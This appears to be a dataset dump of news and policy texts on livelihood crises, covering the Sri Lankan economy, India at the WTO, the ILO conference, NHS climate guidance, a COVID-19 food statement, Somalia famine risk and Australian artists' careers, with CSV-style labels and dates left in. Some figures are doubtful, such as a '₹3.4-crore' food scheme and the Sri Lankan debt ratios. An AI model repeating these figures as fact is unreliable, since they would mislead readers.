The main financial crisis is a result of the increase in loan repayment. According to Central Bank statistics, the ratio of debt servicing to the GDP was above 102% between 2001 and 2004, while between 2020 and 22 it was between 101% to 115% It has been unavoidable to stem the outflow of exchange because of the reduction in exchange and because of government expenditure. The reduction of the dollar reserves, and the fall in the dollar ratio, imports have increased in price drastically. In order to contain government expenditure, interest rates are kept low while printing money has resulted in an increase in money supply causing hyper inflation.

Further there is a large exodus of students who leave for studies out of whom only a few return. This results in a large outflow. On the other hand there is a strong outflow because of the black economy operating and because of money transactions outside government financial regulations. It is not possible to state the value of this definitely but it will be in billions.

Strategies to increase foreign reserves

We have identified three major factors that affected the economic crisis – political issues is the most crucial factor that led to the economic crisis through financial crisis. Since the health disaster is under control and we need more attention on political issues. Within the short period it is difficult to solve all structural issues in politics. As demanded by the people it has made big changes of reappointing the Prime Minister and the Ministers of Cabinet. People are protesting further try to reappoint the president and bring back corrupted money which was invested in other countries.

If it is possible to do, it will be the shortest and easies way to settle the foreign loan and recover the economy soon. What will be the possible solution under the current situation? Monetory policies and fiscal policies are the tools to be handled by the Governor and the Government to solve the issues. At present it has taken some favourable steps by adjusting the interest rate and exchange rate but could not solve the hipper inflation on essential goods so far.

We have to address the major source of foreign exchange earnings in the tourism sector, exports, increase the foreign remittance as well as receive more foreign aids through social and livelihood development project instead of the loan.

We can now see how a short-term policy planning together with the effects of the pandemic have aggravated the crisis in the country. Its continuation will depend on the decisions the authorities in the country take. It is imperative that we bring this situation under control in order to address the economic crisis. We must also establish an internationally accepted stable peaceful government.

In order to develop export industries and export agriculture, the Agriculture Ministry should be made more efficient and expert advice must be sought. Each and every piece of land must be cultivated. Japan and Middle East countries are cultivating fruit and vegetable with a very difficult environment but Sri Lanka has the most agricultural-friendly environment. Further, the country has the traditional method of cultivation without using chemicals. However in commercial farming it is necessary to encourage local fertiliser manufacturers by offering incentives to chemical and organic fertiliser manufacturers.

Every possible assistance must be rendered to these entrepreneurs. The subsidy packages lost when we became an upper or middle income country should be brought back. International relations should be strengthened through capable officers to get quota and tax relief to promote export. On the other hand with the support of Sri Lankans living overseas we must earn more than $ 15 billion income from the exports. Promoting exports will be one most feasible solution to overcome the prevailing crisis.

In the short time, promoting tourism is the easiest way of gaining dollars to the country. Therefore it is a compulsory need to reinstall the peaceful hospitality environment and provide all facilities to fulfil their transport and supported services. Tourist taxi drivers, guides and service providers should have a priority method to supply fuel and ensure the safe service. All parties must unite to solve the political crisis especially because tourism is an answer to the economic issues. Among Asian countries unlike Singapore and other countries Sri Lanka can offer a varied environment. In order to take advantage of this Sri Lanka must employ professional marketers and related experts to attract tourists.

It is necessary to remove the bottlenecks that are present in projects involving non-repayable loans, and low-cost long-term soft loans. Projects for renewable energy and the projects for the reduction of fuel dependence, such as wind, solar power and small scale hydro power plants and new technology must be given priority. It is also necessary to identify useful employment patterns for the country, and new technology, encourage the manufacture of chemical and organic fertiliser, pharmaceuticals and herbal products. Therefore economy will helped if we promote the import subsidiary manufacturing industries to reduce cost of import.

A committee of experts needs to be appointed to evaluate foreign investment and they will encourage investment and promote an investor friendly environment. We are at 99 ranks in the Ease of doing business index but we must aim at a place similar to a country like Vietnam (70) before we proceed to be with countries like Singapore and Japan.

Increasing skilled workforce is the most viable solution for increasing productivity as well as increasing foreign exchange through skilled migration. The vocational training process needs to be accelerated to deliver short-term training to promote foreign employment such as care giver, nursing assistant, baker, etc. Thus both the Government and the private sector must address to train people in NVQ certification for demanded jobs. Soft skills including language competencies are higher value addition to trainees on foreign employment. Each training provider should have a mechanism to provide foreign language training facilities for their trainees.

At the same time foreign employment agencies must widen their services and enable people to apply for foreign work with affordable charges on an honest premise. Above mentioned recommendations will support to significantly overcome the prevailing crisis but it should have multi solutions which I hope to publish in part two of this article.

But economic inequities have complicated this arrangement, especially for developing countries.
India sought differential treatment between developed and developing countries on fishing.
S&DT permits developing countries certain concessions as compared to the developed world, because of historical reasons.
“India strongly believes that the WTO should not negotiate rules on non-trade-related subjects like climate change, gender, etc.","India criticised the World Trade Organization (WTO), particularly rich countries, accusing them of not doing enough to tackle the crises brought on by the pandemic and rising food prices, which put millions of people in poor nations at the risk of starvation.

Union commerce minister Piyush Goyal made the remark while representing India at the plenary session of the Twelfth Ministerial Conference (MC12) of the WTO on Sunday, where he urged members to help the least developed countries (LDCs) recover from the pandemic and access foodgrain supplies that have undergone high global inflation because of the war in Ukraine.

“The pandemic reinforced the importance of ‘One Earth One Health’, calling for global solidarity and collective action,” he said, referring to India’s effort in ramping up supplies of medical products globally and providing Covid-essential items, including vaccines, to several countries.

“Unfortunately, the WTO could not respond with alacrity. We have let down the people of the LDCs and developing countries. The rich countries need to introspect! We need to bow our heads in shame for our inability to respond to the pandemic in time,” he said in his address.

Goyal drew attention of the multilateral forum to the humanitarian crisis triggered by spiralling food inflation and called it a “matter of deep concern”, while also underscoring the importance of nurturing domestic capacities to produce food. “Rising food prices threaten the survival of millions and subjugate the poor and vulnerable nations/people to imperfect markets,” he said.

India, which is supporting its 800 million poor through food security programmes such as the ₹3.4-crore scheme under the Prime Minister Garib Kalyan Ann Yojana (PMGKAY), reiterated the need to have public procurement of foodstocks by offering minimum support price (MSP) to farmers.

“After the Bali Ministerial Decision in 2013, the General Council in 2014 mandated permanent solution on the issue of public foodstocks, which has already been delayed, should be the topmost priority for MC12, before we move to new areas. Nothing is more important than this for the people of the world,” he said.

The public foodstocks issue stems from the WTO’s restrictions on subsidies the government can provide, a restriction that was meant to ensure markets remain competitive globally. But economic inequities have complicated this arrangement, especially for developing countries.

“Our collective moral obligation is to ensure that no person, anywhere in the world, goes to bed hungry and WTO rules should facilitate this. The Covid-19 pandemic has reinforced once again the need and efficacy of food stockholding for public good,” he said.

India’s stand on this matter is backed by the G33, a group of 47 developing and least developed countries. Separately, addressing the G33, Goyal urged them to work collectively to get a fair, balanced and development-centric outcome at the WTO that must also include a permanent solution for the public stockholding.

According to current WTO rules, a member country’s food subsidy is capped at a ceiling of 10% of the value of production based on 1986-88 prices. The cap can be exceeded in certain circumstances under a peace clause.

Last year, India invoked the peace clause for the third time for rice procurement exceeding the 10% ceiling on the subsidy it offered to its farmers, which is critical for the country’s food security.

India’s stand has been that public stockpiling is critical for its food security and total subsidies given by the US and the European Union nations far exceed those offered by India, based on India’s updated calculations.

India and other like-minded countries now want a permanent solution to this matter. The ‘peace clause’ was adopted at the Ninth Ministerial held in Bali in December 2013 as an “interim solution” to avoid raising disputes under various provisions on WTO Agreement on Agriculture (AoA) with respect to public stockholding (PSH).

India sought differential treatment between developed and developing countries on fishing. “Fishing by my country’s traditional fishermen and women is to address hunger, poverty, food and nutrition insecurity, which is largely sustenance fishing. Their right to life and livelihood cannot be curtailed in any manner. On the contrary, those nations responsible for depleted fish-stock should assume responsibility, having exploited the oceans for far too long by giving subsidies,” he said, adding that living in harmony with nature is enshrined in Indian culture and its fishing communities customarily do not fish during the breeding season to allow stocks to be replenished, thereby maintaining the aquatic ecological balance.

The WTO should embrace a people-first approach to trade, Goyal said. “…let me say that when the world is facing severe challenges and expects the WTO to deliver solutions, the MC12 must send a strong message that the rich care for the poor, vulnerable and marginalised people and that we have come together to give them a better future,” he said.

WTO reform is necessary keeping development at its core, to be decided through a precise, transparent and inclusive process, upholding the basic principles and objectives of the WTO, particularly consensus-based decision making and special and differential treatment (S&DT).

S&DT permits developing countries certain concessions as compared to the developed world, because of historical reasons.

“India strongly believes that the WTO should not negotiate rules on non-trade-related subjects like climate change, gender, etc. which legitimately fall within the domain of other inter-governmental organisations,” Goyal said.

Goyal, however, said India is committed for environment protection. “India reiterates our Prime Minister’s clarion call for sustainable living through ‘Lifestyle For Environment (LiFE)’, a movement aimed at promoting environment-conscious lifestyle, focusing on ‘mindful and deliberate utilisation’ instead of ‘mindless and destructive consumption’. He quoted Mahatma Gandhi to make the point: “The world has enough for everyone’s needs, but not for everyone’s greed.”",Livelihood Crisis,2022-06-12 19:08:59

He expressed support for the organization’s activities and programmes in achieving these goals, in light of the remarkable success achieved by the organization’s technical cooperation programme with Qatar, which is considered a pioneering model that can be imitated by the rest of the countries in the region.

The Minister noted that Qatar will host the 5TH United Nations Conference of the Least Developed Countries during in March 2023, which reflects the belief of Qatar in the importance of strengthening international solidarity in order to bring about change that puts these countries on the desired track towards sustainable and comprehensive development.

The Minister of Labour participated yesterday in Geneva in the closing session of the 110th International Labour Conference (ILC), in the presence of heads of delegations, ministers of Labour and representatives of workers and employers in member states of the International Labour Organization.

The ministry participated in ILC with a high-level delegation as part of its efforts to communicate with international organizations and discuss the latest developments in the labour sector globally.

The conference discussed the report of the economies of the least developed countries and the Ukrainian crisis, the reports of the Committee of Legal Experts on ILO conventions and recommendations, and the plenary sessions of the conference discussed issues of decent work, social and solidarity economy, as well as the strategic goal of employment as part of the follow-up mechanism to the ILO Declaration on Social Justice for a Fair Globalization

The 110th session of the International Labour Conference for the year 2022 acquired a special attention, especially in light of the successive global crises, which rendered rippling negative impacts on the world of labour.

Nearly 5,000 delegates from 187 member states participated in the conference’s work, representing the three working parties: governments, employers, and workers.

The conference discussed the report of the economies of the least developed countries and the Ukrainian crisis, the reports of the Committee of Legal Experts on ILO conventions and recommendations, and the plenary sessions of the conference discussed issues of decent work, social and solidarity economy, and the strategic goal of employment as part of the follow-up mechanism to the ILO declaration on social justice for a fair globalization .

Dr. Ali bin Smaikh Al Marri, Vice-President of the 110th International Labour Conference, underlined that the outputs of the International Labour Conference, especially those that will address the challenges facing the international community in the labour world, are massively momentous during the current stage, noting that focusing on the least developed countries and the most vulnerable to setbacks than the rest of the member states will enhance the positive results of implementing those outputs and recommendations.

The Minister, during his speech at the closing session of the conference, made it clear during his speech at the closing session of the conference that choosing the topic of the report for this year was good, as it emphasised the need to support the structural transformation in these countries in accordance with Doha Programme of Action for LDCs (2022-2031) explaining that the Director General’s report provided an opportunity for delegations participating in the current session to discuss the ways to promote decent work and meet the future challenges of the labour world.

He welcomed the issuance of the decision approving the amendments to the Maritime Labour Agreement of 2006, which were approved by the ILO’s Special Tripartite Committee in the fourth session of the conference, noting that the amendments were approved most of them based on lessons and experiences gleaned from the COVID-19 pandemic period and its negative effects on work in the maritime sector and the conditions of work in the maritime sector especially those that have stricken the seafarers’ livelihood and work, and in particular regulations for food, medical care on board, health and safety measures, and accident prevention.",Livelihood Crisis,2022-06-12 05:55:00

This guide is part of All Our Health, a resource which helps health and care professionals prevent ill health and promote wellbeing as part of their everyday practice. The information below will help frontline health and care professionals use their trusted relationships with patients, families and communities to reduce the contribution of the health and care system to the climate crisis.

We also recommend important actions that managers and staff holding strategic roles can take.

Why it matters

Why act on the climate crisis in your professional practice

The health of the planet is inextricably linked to human health and wellbeing. A healthy planet provides us with our most basic needs:

fertile land for food production

safe water to drink

clean air to breathe

The warming of the planet, known as climate change, is degrading our planet’s life-support system and threatens our ability to thrive and survive. Climate change is happening more quickly than previously feared and represents an urgent global crisis requiring a bold, united response.

Climate change has been identified as the most important health threat of the century, but it is also the “greatest opportunity to redefine the social and environmental determinants of health”. Everyone working in health and care needs to prepare for and be equipped to respond to the health impacts of the climate crisis.

The climate crisis has an important impact on health.

Global temperatures are rising at an unprecedented rate, driven by a build-up of greenhouse gases in the atmosphere. These gases, of which the most commonly known is carbon dioxide, are largely a result of burning fossil fuels. Global temperatures continue to rise and are expected to surpass the 1.5 to 2 degree threshold, triggering unprecedented changes to climate systems, with devastating impacts for human health and wellbeing.

The science is unequivocal; a global increase of 1.5°C above the pre-industrial average and the continued loss of biodiversity risk catastrophic harm to health that will be impossible to reverse.

(The Lancet, 2021)

In the UK, average surface temperature has already risen by 1.2°C and the effects of climate change are already apparent. The UK is particularly at risk of drought, flooding and extreme weather events, all of which threaten the water, food, infrastructure and supply systems we depend on.

A warming climate affects health in 3 main ways:

Effects of extreme weather, such as heatwaves, flooding, wildfire, storms and drought on physical and mental health (for example injuries and trauma, heat-related illness). Such events are expected to increase in frequency and severity in coming years. Effects on the planet’s life-support systems, such as rising sea levels and safe water availability, changing patterns of zoonotic and vector-borne disease (for example malaria, dengue fever), reduced pollination and crop failure leading to food shortages. Effects mediated by social systems, such as livelihood loss, rising prices of food and fuel, supply chain disruption, pressure on health and care services, conflict or forced migration.

The climate crisis affects our efforts to safeguard the health of the population and therefore tackling it as a determinant of health is a crucial aspect of our role as health and care professionals.

Actions to prevent and prepare for the climate crisis will improve public health

Reducing our contribution to the climate crisis and creating resilience to respond to the worst impacts of a warming climate is an opportunity to protect health. Importantly, much of what can be done is a ‘win-win’ for both the environment and for health.

The good news is that greenhouse gas emissions can be reduced in a way that addresses public health challenges; these are ‘win-win’ opportunities. We know that increasing physical activity through active travel, making nutritious and sustainable food readily available and improving air quality and housing will reduce the risk of obesity, cardiovascular and respiratory disease, certain cancers and diabetes. These actions will also help achieve national commitments to reduce our contribution to the climate crisis.

Specific ‘win-win’ opportunities for health and the climate crisis

Transport

Transport is the largest greenhouse gas-emitting sector in the UK, accounting for 28% of total emissions. Our transport system is largely road-travel dependent, and this has been a major factor in reducing physical activity through active travel and increasing obesity-related morbidity and mortality in the UK. Physical inactivity directly contributes to 1 in 6 deaths in the UK and costs wider society £7.4 billion a year.

Transport is also a major cause of air pollution. Burning fossil fuels for vehicles and industrial processes fills the air we breathe with greenhouse gases that warm the atmosphere and are released with pollutants that directly impact human health. In the UK, air pollution is responsible for an estimated 28,000 to 36,000 excess deaths a year, with the health costs of air pollution estimated to be between £8.5 billion and £20.2 billion. Find out more about the health impacts of air pollution.

If we, as health and care professionals, can help people to increase the number of journeys taken on foot, by bicycle or public transport, we will see benefits for both health and the climate.

Housing

Homes that lack energy efficiency contribute to climate change and negatively impact our health. Home energy use accounts for 14% of UK greenhouse gas emissions, with the vast majority of energy consumption from coal, oil and gas. Inefficient energy use in homes, as well as rising energy prices, increases the risk of fuel poverty and cold homes. Fuel poverty affects 13.4% of households in the UK. Improving the energy efficiency of homes is the most effective way of tackling fuel poverty in the long term. It reduces the amount of energy required to heat the home and can therefore contribute to reduced energy bills and a warmer, safer home.

The burden of ill health from cold homes remains significant in the UK. Living in a cold home represents a considerable risk to health, wellbeing and inequalities. Cold homes are recognised as a source of both physical and mental ill health, increasing the risk of heart attack and stroke, respiratory illness, falls and accidents. Equally, with increasingly warmer temperatures due to global warming, there is also a significant risk to health, particularly for older people, very young children, and those with chronic health conditions of living in a home that is too hot. Ensuring homes are well ventilated can not only help to reduce temperatures on hot days but can also benefit health by improving indoor air quality.

If we, as health and care professionals, can help to encourage efficient energy usage in homes, as well as ensure that homes are not too hot or too cold, we will see benefits for both health and the climate.

Food

Our current food system is a major contributor to global temperature rise, deforestation, biodiversity loss, freshwater overextraction, as well as air and plastic pollution. At the same time, the way we eat is causing significant morbidity and mortality, with poor diets increasing the risk of heart disease, high blood pressure, type 2 diabetes, obesity and certain cancers. Diet-related ill health is estimated to cost the NHS and wider UK society £5.1 billion per year, having a higher impact on the NHS budget than smoking, alcohol consumption and physical inactivity.

The foods most damaging to our health are often those with the highest emissions, pollution, land and water use. A diet rich in plant-based foods, and lower in animal source foods which have a significant environmental impact, has benefits for health and the environment. Adherence to the Eatwell Guide which encourages a high consumption of fruits, vegetables, wholegrains and plant-based protein, could contribute to a 7% reduction in mortality and a 30% reduction in greenhouse gas emissions.

If we, as health and care professionals, can encourage people to adopt a balanced, sustainable diet and promote wider changes to our food system, we would reduce the environmental impact of food production and supply, as well as reduce the risk of diet-related disease.

Green space

Our interaction with natural places can have a significant impact on our health. Protecting nature and biodiversity safeguards health and wellbeing. People who live in greener neighbourhoods have higher self-reported health and mental wellbeing. Exposure to green spaces has been shown to improve mood, reduce anxiety, and reduce the risk of type 2 diabetes and cardiovascular disease. ‘Green exercise’, or taking physical activity in green or natural environments, may also provide additional benefits to people’s overall wellbeing. It is estimated that £2.1 billion per year could be saved in health costs if everyone in England had good access to green space, due to the increased physical activity in these spaces.

Green spaces can also bring communities together, reduce loneliness and mitigate the negative effects of air pollution, excessive noise, heat and flooding. However, green space access is closely linked to health and social inequalities. The most affluent wards in England have 5 times the amount of parks and green space compared to the most deprived 10% (Public Health England, 2020).

If we, as health and care professionals, can promote the protection of green spaces, and implement nature-based interventions for health, such as green walking for mental health or green social prescribing, we can improve the health of people and the planet, while reducing health inequalities.

Social and health inequalities

The climate crisis and the social justice crisis are closely related. Those most likely to suffer the worst consequences of climate change have contributed the least to it. Deprived areas have the poorest air quality while producing a much lower proportion of housing and travel emissions. The political and economic systems which drive the climate crisis also drive social injustice.

The climate crisis impacts people differently depending on their susceptibility, risk and ability to cope. For example, elderly populations, people living in care homes and those with underlying health conditions are more likely to suffer from the effects of extreme heat and cold. Fuel poverty and poor housing can exacerbate these effects.

People from deprived areas face disproportionately higher flood risk than those in wealthy areas, particularly in coastal and rural zones, which could mean they are more vulnerable to flood-related financial and livelihood loss.

If we, as health and care professionals, act on the climate crisis in a way that addresses social inequalities, we can ensure that the costs of climate action are not unfairly borne by those with lower incomes or other social disadvantages.

The health sector is committed to action

Policies and commitments at international and national levels require the health sector to take action on the climate crisis. At a global level, the UK has signed the Paris Agreement, a legal commitment to keep global temperatures below 2 degrees Celsius and reduce carbon emissions by 45% by 2030. Commitments made at the COP26 meeting in 2021 put us on track for 2.5 degrees of warming.

At a national level, the UK Climate Change Act 2008 requires the government to undertake 5-yearly assessments of climate risks and produce a National Adaptation Plan for responding to the identified risks, including the risks to health and wellbeing as a priority.

Within the health and care sector, the NHS in England became the first healthcare system in the world to commit to reduce the carbon emissions it can directly influence (for example, the amount of electricity used by hospitals) to net zero by 2040. Carbon emissions it cannot control but can influence (for example, emissions from manufacturers within the supply chain) will be reduced to net zero by 2045.

These commitments are essential because the health and care system in England accounts for approximately 5% of the country’s national greenhouse gas emissions. Particular carbon ‘hotspots’ include supply-chain derived items such as pharmaceuticals and medical equipment, as well as certain anaesthetic gases and patient or staff travel (see graph below). The health system also contributes to plastic and air pollution:

in catering alone, the NHS bought at least 163 million plastic cups, 16 million pieces of plastic cutlery, 15 million straws and 2 million plastic stirrers in 2018

one in 20 cars on the road are related to the NHS

For a sector based on the principle of “First, do no harm,” the health and care sector must act quickly and collectively to mitigate its own climate damage.

What you can do to help

Reducing the impact of healthcare on the climate crisis

Health and care professionals have an integral role to play in reducing the contribution of the health and care system to the climate crisis. Patient-facing health workers have a particularly important role given they are able to influence how many resources are used and how much healthcare activity is undertaken. Clinical care is responsible for the high-emitting consumption of pharmaceuticals, equipment and consumables, while clinical decisions determine how patients move through the system, for example whether they are admitted to hospital, or how often they need to make a journey to an outpatient clinic.

Reaching NHS Net Zero demands that the health and care system becomes environmental, socially and economically sustainable. This will require leadership and innovation from NHS staff.

A sustainable health system will:

help prevent illness

give greater control to patients in managing their health

be leaner by streamlining care systems to minimise wasteful activities

prioritise treatments and technologies with a lower carbon footprint

Core principles for health and care professionals

This All Our Health climate crisis information has been created to help all health and care professionals understand that the climate crisis is a problem for health, and how healthcare professionals need to prepare for and respond to it.

Health and care professionals are highly trusted and therefore well placed to advocate for action on the climate crisis and the health impacts it has. By acting on the climate crisis, we can safeguard population health against the worst effects of a warming climate.

Health and care professionals should recognise the climate crisis as a health crisis, and therefore climate action as a core part of their professional responsibilities. Delivering on this, they can:

take everyday opportunities to talk with colleagues, management and patients or clients about the link between climate and health and the importance of taking action now

incorporate ’win-win’ interventions which improve health while taking climate action

reduce the contribution that health and care has on the climate crisis

Taking action

Frontline health and care professionals

Health and care professionals can implement these core principles by:

educating themselves and others about the climate crisis and health

promoting and protecting public health

reducing the environmental impact of healthcare

Educate yourself and others about the climate crisis and health

Ask colleagues whether they are willing to make positive changes together. See how to have a climate conversation.

Check whether your organisation has a Sustainability Action Plan or Green Plan for NHS Net Zero ambitions.

Encourage your professional networks and regulatory bodies to declare a climate emergency as a commitment to climate action.

Become a Climate Champion or Environmental Champion, join or start a Green Impact team. Find out how to join climate action and sustainability initiatives at work.

Promoting and protecting public health

Using the Make Every Contact Count (MECC) approach – use every opportunity to talk to patients and their families about ways they can improve their health which also have a positive impact on the environment.

Encourage patients and staff to use active travel when appropriate for them, especially for short journeys.

Help patients and staff reduce their exposure to air pollution, and to the risk associated with high pollution episodes.

Identify patients most vulnerable to cold or hot weather (children, the elderly, those with chronic conditions), and ensure they know how to keep their homes at a reasonable temperature. Use this online training course to learn how to refer patients for support if they are living in cold homes.

Encourage patients and staff to increase their consumption of whole grains, nuts, seeds, plant-based protein, fruits and vegetables, whilst reducing red meat and processed food consumption.

Encourage patients and staff to increase their use of green spaces for both physical and mental health. You can make this part of your management plan using these green social prescribing resources.

Reducing the environmental impact of healthcare

Opt for low-carbon treatments and technologies where appropriate.

Use this National Institute for Clinical Excellence ( NICE ) patient decision aid to help you to discuss with your patient the benefits of switching to a lower-carbon inhaler for their respiratory disease.

Anaesthetists, A&E and maternity services staff can reduce the use of highly polluting anaesthetic gases like nitrous oxide or desflurane.

Reduce unnecessary resource use.

Replace single-use with recyclable or multi-use consumables where appropriate.

Reduce the waste associated with prescribing medicines.

Actively travel to or at work, using public transport where available, and avoid air travel wherever possible.

Use communication technology when appropriate to reduce staff and patient travel.

Switch off lights and computers when not in use, reduce paper use and optimise recycling.

Help transition towards low-carbon models of healthcare.

Use a sustainable quality improvement approach to redesign pathways, processes and services, by embedding sustainability into quality improvement projects.

Join a sustainable healthcare network.

Immediate and purposeful action to save lives and livelihoods should include extending social protection towards universal health coverage and income support for those most affected.
Only then can we protect the health, livelihoods, food security and nutrition of all people, and ensure that our ‘new normal’ is a better one.","The COVID-19 pandemic has led to a dramatic loss of human life worldwide and presents an unprecedented challenge to public health, food systems and the world of work. The economic and social disruption caused by the pandemic is devastating: tens of millions of people are at risk of falling into extreme poverty, while the number of undernourished people, currently estimated at nearly 690 million, could increase by up to 132 million by the end of the year.

Millions of enterprises face an existential threat. Nearly half of the world’s 3.3 billion global workforce are at risk of losing their livelihoods. Informal economy workers are particularly vulnerable because the majority lack social protection and access to quality health care and have lost access to productive assets. Without the means to earn an income during lockdowns, many are unable to feed themselves and their families. For most, no income means no food, or, at best, less food and less nutritious food.

The pandemic has been affecting the entire food system and has laid bare its fragility. Border closures, trade restrictions and confinement measures have been preventing farmers from accessing markets, including for buying inputs and selling their produce, and agricultural workers from harvesting crops, thus disrupting domestic and international food supply chains and reducing access to healthy, safe and diverse diets. The pandemic has decimated jobs and placed millions of livelihoods at risk. As breadwinners lose jobs, fall ill and die, the food security and nutrition of millions of women and men are under threat, with those in low-income countries, particularly the most marginalized populations, which include small-scale farmers and indigenous peoples, being hardest hit.

Millions of agricultural workers – waged and self-employed – while feeding the world, regularly face high levels of working poverty, malnutrition and poor health, and suffer from a lack of safety and labour protection as well as other types of abuse. With low and irregular incomes and a lack of social support, many of them are spurred to continue working, often in unsafe conditions, thus exposing themselves and their families to additional risks. Further, when experiencing income losses, they may resort to negative coping strategies, such as distress sale of assets, predatory loans or child labour. Migrant agricultural workers are particularly vulnerable, because they face risks in their transport, working and living conditions and struggle to access support measures put in place by governments. Guaranteeing the safety and health of all agri-food workers – from primary producers to those involved in food processing, transport and retail, including street food vendors – as well as better incomes and protection, will be critical to saving lives and protecting public health, people’s livelihoods and food security.

In the COVID-19 crisis food security, public health, and employment and labour issues, in particular workers’ health and safety, converge. Adhering to workplace safety and health practices and ensuring access to decent work and the protection of labour rights in all industries will be crucial in addressing the human dimension of the crisis. Immediate and purposeful action to save lives and livelihoods should include extending social protection towards universal health coverage and income support for those most affected. These include workers in the informal economy and in poorly protected and low-paid jobs, including youth, older workers, and migrants. Particular attention must be paid to the situation of women, who are over-represented in low-paid jobs and care roles. Different forms of support are key, including cash transfers, child allowances and healthy school meals, shelter and food relief initiatives, support for employment retention and recovery, and financial relief for businesses, including micro, small and medium-sized enterprises. In designing and implementing such measures it is essential that governments work closely with employers and workers.

Countries dealing with existing humanitarian crises or emergencies are particularly exposed to the effects of COVID-19. Responding swiftly to the pandemic, while ensuring that humanitarian and recovery assistance reaches those most in need, is critical.

Now is the time for global solidarity and support, especially with the most vulnerable in our societies, particularly in the emerging and developing world. Only together can we overcome the intertwined health and social and economic impacts of the pandemic and prevent its escalation into a protracted humanitarian and food security catastrophe, with the potential loss of already achieved development gains.

We must recognize this opportunity to build back better, as noted in the Policy Brief issued by the United Nations Secretary-General. We are committed to pooling our expertise and experience to support countries in their crisis response measures and efforts to achieve the Sustainable Development Goals. We need to develop long-term sustainable strategies to address the challenges facing the health and agri-food sectors. Priority should be given to addressing underlying food security and malnutrition challenges, tackling rural poverty, in particular through more and better jobs in the rural economy, extending social protection to all, facilitating safe migration pathways and promoting the formalization of the informal economy.

We must rethink the future of our environment and tackle climate change and environmental degradation with ambition and urgency. Only then can we protect the health, livelihoods, food security and nutrition of all people, and ensure that our ‘new normal’ is a better one.",Livelihood Crisis,2020-10-13 07:00:00

Worsening drought is putting some areas in central and southern Somalia at an increased Risk of Famine through at least September 2022 if the current Gu season crop and livestock production fails, food prices continue to rise sharply and humanitarian assistance is not scaled up to reach those most in need. These areas include Hawd Pastoral of Central and Hiraan, Addun Pastoral of Northeast and Central, Agro Pastoral livelihoods in Bay and Bakool regions, and IDP settlements in Baidoa, Mogadishu, Dhusamareb, and Galkacyo. The situation in Bay region is particularly concerning as the acute malnutrition threshold for Famine (IPC Phase 5) has been breached in Baidoa district. Mortality (Crude Death Rate) has reached the Emergency (IPC Phase 4) threshold in Bay Agropastoral of Burhakaba and Baidoa districts, and death rates among children have reached the Emergency (IPC Phase 4) threshold in Bay Agropastoral of Baidoa district. While a Famine (IPC Phase 5) classification requires at least two of the three criteria to be met, the increase in acute malnutrition levels and mortality signal that loss of life and livelihoods is already occurring. For these districts, additional data collection and analysis are planned in June to ascertain whether, in the projected period, the most likely scenario would result in an IPC Phase 5 (Famine) classification at the area level.

Acute food insecurity has continued to worsen across Somalia, with an estimated 5.2 million people (or 33% of the total population) already experiencing Crisis or worse (IPC Phase 3 or higher) outcomes, including 38,000 people likely in Catastrophe (IPC Phase 5), as of May 2022, despite the ongoing delivery of humanitarian food assistance. Food assistance reached an average of 2.4 million people per month between February and April 2022 and has likely prevented the worsening of food security and nutrition outcomes in many areas. However, humanitarian assistance delivery is far short of the rising level of need, and insufficient funding is expected to lead to pipeline breaks in food assistance delivery after June.

Food insecurity and malnutrition are expected to deteriorate further and faster between June and September 2022, and if humanitarian food assistance is not scaled up and sustained, then approximately 7.1 million people (or 45% of the total population) are expected to face Crisis or worse (IPC Phase 3 or higher) outcomes. This figure includes 2.1 million people that will likely be in Emergency (IPC Phase 4) and at least 213,000 people that will likely be in Catastrophe (IPC Phase 5). In addition to the population groups that face an increased Risk of Famine, other areas of concern include Northern Inland Pastoral of Northwest, Hawd Pastoral of Northwest,

Southern Agropastoral, Southern Rain-fed Agropastoral of Middle and Lower Juba, and Togdheer Agropastoral livelihood zones as well as IDP settlements in Burao, Lasaanod, Garoowe, Belet Weyne, Doolow and Kismaayo, all of which face Emergency (IPC Phase 4) between June and September 2022. Based on the results from 11 integrated food security, nutrition and mortality surveys conducted between late April and early May 2022, the total acute malnutrition burden estimates for Somalia for 2022 have been revised and updated. Accordingly, as of May 2022, an estimated 1.5 million children under the age of five years (total acute malnutrition burden), representing 45 percent of the total population of children, face acute malnutrition through the end of the year, including 386 400 who are likely to be severely malnourished.

Urgent and timely scaling up of integrated humanitarian assistance is required to prevent extreme food insecurity and acute malnutrition, including starvation and excess mortality, in areas facing an increased Risk of Famine through at least September 2022. In particular, malnutrition and mortality outcomes in Baidoa and Burhakaba districts in Bay region already point to an extremely concerning situation as of May 2022. While only one of the criteria of Famine (IPC Phase 5) has been met in Baidoa district as of May, there is increasing concern that further deterioration in food consumption, acute malnutrition, and mortality may lead to Famine (IPC Phase 5) in these two districts if humanitarian assistance is not scaled up urgently in these areas. A new round of data collection will be undertaken in June to further assess the likelihood of Famine (IPC Phase 5) in Bay Region. Moreover, available long-range forecasts indicate that a record fifth below-average rainy season is likely across Somalia during the forthcoming October and December 2022 Deyr season. Therefore, humanitarian needs are expected to worsen and remain high nationally well into 2023.",Livelihood Crisis,2022-06-06 13:47:06

Many artists and arts workers have “portfolio careers”, piecing together a mixture of jobs while competing for limited funding and career opportunities in the arts.

COVID-19 shone a glaring spotlight on this precarity, exposing the lack of permanent jobs in the sector. Some 81% of artists work as freelancers or on a self-employed basis, without access to sick leave or other entitlements many Australians take for granted.

But the unsustainability of creative careers was already well known to artists, academics and governments.

Career sustainability

In 2019, I set out to understand what “sustainability” means to Australia’s arts and culture sector. I analysed 564 annual reports published between 2010 and 2018 and over 2,700 submissions in the 2014 and 2015 Senate Inquiry into arts funding. I also interviewed 33 artists and arts managers representing all parts of the performing arts sector.

One interviewee defined a “sustainable career” as:

one in which you’re employed in your practice to the extent that you can live. For a lot of artists that’s just about a roof over their head and feeding themselves. […] I think we should be able to have mortgages and raise kids […] I look at some of the singers that I work with and that’s really hard for them to do.

Even artists who are successful in multiple facets of their career – including some of our most celebrated theatre directors – can feel like these careers are not sustainable.

One contributor to the Senate Inquiry observed:

Artists can have successful exhibitions, be collected by national and international institutions, and still not make a sustainable living.

Interestingly, I observed significant differences in how different arts companies wrote about sustainability in their annual reports. Career sustainability was mentioned more often by theatre companies than other art forms. Opera and circus tied in second place. While comparable data is not available for Australia, findings from the UK suggest a high percentage of freelancers working in theatre might explain this difference.

Inherent demands

Working in the performing arts involves both physical demands and mental strain. Artists described to me how they have to maintain “the body of an elite athlete” and how the “obsessive requirement to be excellent all the time” leads to “consistent performance-related anxiety.”

The inevitable long hours and extensive travel also make this a family-unfriendly career. Artists explained the expectation they work outside of ordinary business hours, the need to “travel where the work is” and feeling like they needed to leave the arts if they wanted to raise a family.

